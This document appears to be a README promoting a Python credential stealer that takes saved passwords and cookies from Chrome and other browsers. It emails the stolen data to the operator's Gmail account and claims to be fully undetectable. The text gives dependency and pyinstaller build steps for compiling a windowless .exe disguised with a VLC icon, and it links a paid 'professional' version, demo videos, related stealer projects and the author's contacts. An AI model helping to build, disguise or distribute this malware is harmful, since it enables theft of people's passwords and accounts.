# steal-chrome-password-all-version


Python steal chrome password all version are supported FUD 100 %

receive data by email

## depandance

download and install Python > 3.0

https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe


 after install Python :
 
 ## simple installation dependances :
 
 test steal password with local script
 
 run " build_local.bat "
 
 build_local.bat will download and install depandances after he will build your .exe with icon vlc
 
 
 
open my_email.py

put your gmail email (and password ), email sender

run  build_email.bat : will download and install depandances after he will build your .exe with icon vlc
 
## Manuel installation
 
 open your cmd and install Dependencies

 pip install pywin32

 pip install Pillow

 pip install requests

pip install cryptography

pip install pyinstaller


* to build with .exe ,run :

pyinstaller my_email.py -F -w


* Version Professionel ( another script 100 % fud )

![steal password](https://user-images.githubusercontent.com/30985149/87238256-e4b6b280-c3ef-11ea-8051-091d6c813cd8.png)


Stealing passwords and cookies from web browsers

* Chrome
* Microsoft Edge
* Firefox
* Opera
* yandex

https://shoppy.gg/product/RfFAnNR


## Demo Youtube (simple installation )

https://www.youtube.com/watch?v=KE-DUxuRVeo


## Demo Youtube (password and cookie )

https://youtu.be/kzTg2bQ2RlU


## demo Facebook( manuel installation )

https://www.facebook.com/102313318301415/videos/3262395040481000/

## other similar project

https://github.com/hakanonymos/steal-cookie-chrome-firefox

https://github.com/hakanonymos/A310LoggerStealer ( 2021 )

Happy Hacking 

## Contact 

hakanonymos@hotmail.com

Telegram : https://t.me/hakanonymos

ICQ,Skype,instagram : hakanonymos


